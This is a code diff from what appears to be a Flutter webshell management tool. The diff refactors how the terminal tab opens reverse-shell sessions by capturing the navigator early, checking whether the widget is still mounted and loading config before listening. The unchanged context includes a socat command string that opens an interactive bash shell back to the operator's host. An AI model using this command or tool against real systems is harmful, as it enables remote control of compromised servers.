@@ -602,10 +602,12 @@ class _TerminalTabState extends State<_TerminalTab>
     if (mode == 'script' || mode == 'bash') {
       // 内置反弹：通过当前 Webshell 的连接器发送一次反弹命令
       // 具体使用 script 还是 bash 由各自连接器的 startReverseShell 实现决定。
+      final nav = Navigator.of(context);
+      final label = widget.service.webshell.name;
       rs.onSession = (session) {
-        // 为会话打上来源标记，便于在「完整终端」页面展示 Webshell 名称
-        session.label = widget.service.webshell.name;
-        Navigator.of(context).push(
+        session.label = label;
+        if (!mounted) return;
+        nav.push(
           MaterialPageRoute(
             builder: (_) => ReverseShellTerminalPage(session: session),
           ),
@@ -613,6 +615,7 @@ class _TerminalTabState extends State<_TerminalTab>
       };
 
       try {
+        await rs.loadConfig();
         await rs.startListening(port: rs.lport);
         // 只调用一次 startReverseShell，并通过 preferScript 区分 script/bash 方案。
         await widget.service.startReverseShell(
@@ -648,7 +651,17 @@ class _TerminalTabState extends State<_TerminalTab>
 
     if (mode == 'socat') {
       // socat 模式：仅启动本地监听，并给出在目标上执行的 socat 命令
+      final nav = Navigator.of(context);
+      rs.onSession = (session) {
+        if (!mounted) return;
+        nav.push(
+          MaterialPageRoute(
+            builder: (_) => ReverseShellTerminalPage(session: session),
+          ),
+        );
+      };
       try {
+        await rs.loadConfig();
         await rs.startListening(port: rs.lport);
       } catch (e) {
         if (!mounted) return;
@@ -662,15 +675,6 @@ class _TerminalTabState extends State<_TerminalTab>
         );
         return;
       }
-
-      // 有新会话时自动打开完整终端
-      rs.onSession = (session) {
-        Navigator.of(context).push(
-          MaterialPageRoute(
-            builder: (_) => ReverseShellTerminalPage(session: session),
-          ),
-        );
-      };
 
       final cmd = 'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:${rs.lhost}:${rs.lport}';
 
